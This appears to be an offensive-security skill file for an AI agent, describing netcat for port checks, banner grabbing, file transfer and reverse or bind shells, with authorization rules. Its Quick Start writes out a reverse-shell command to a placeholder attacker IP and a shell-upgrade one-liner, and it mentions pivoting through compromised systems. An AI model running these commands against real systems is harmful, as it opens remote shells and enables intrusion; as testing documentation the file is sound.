---
name: network-netcat
description: Network utility for reading and writing data across connections, port scanning, and shell communication.
metadata:
  version: 0.2.0
  category: offsec
  tags:
  - networking
  - netcat
  - reverse-shell
---
# Netcat Network Utility

## Quick Start
```bash
# Listen on port 4444 (Attacker)
nc -lvnp 4444

# Reverse shell from target to attacker
nc <attacker-ip> 4444 -e /bin/bash

# Banner grab a service
echo "" | nc <target-ip> 80
```

## Workflow
1. **Verify Authorization**: MUST have explicit permission before testing.
2. **Connectivity Test**: Test port availability with `-vz` (TCP) or `-uvz` (UDP).
3. **Banner Grabbing**: Extract service information for enumeration.
4. **Shell/File Ops**: Establish reverse/bind shells or transfer files if authorized.
5. **Upgrade Shell**: If the shell is not interactive, upgrade with `python -c 'import pty; pty.spawn("/bin/bash")'`.
6. **Cleanup**: Terminate all listeners and remove any temporary files (e.g., `/tmp/f`).

## Rules & Constraints
- **RULE-1**: MUST have written authorization for all network operations.
- **RULE-2**: DO NOT leave backdoors or persistent listeners without explicit request.
- **RULE-3**: ALWAYS prioritize reverse shells over bind shells to bypass firewalls.

## When to Use
- Testing network connectivity, port availability, and service banners.
- Establishing shells or transferring files in authorized security testing.
- Creating temporary relays or pivots through compromised systems.

## When NOT to Use
- Large-scale network reconnaissance (use `recon-nmap`).
- Fuzzing or complex protocol analysis.
- Unauthorized access or persistence.

## References
- [Netcat Manual (Flags, Shells, File Transfers)](references/netcat-manual.md)
- [Ncat Users' Guide](https://nmap.org/ncat/guide/index.html)
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings)
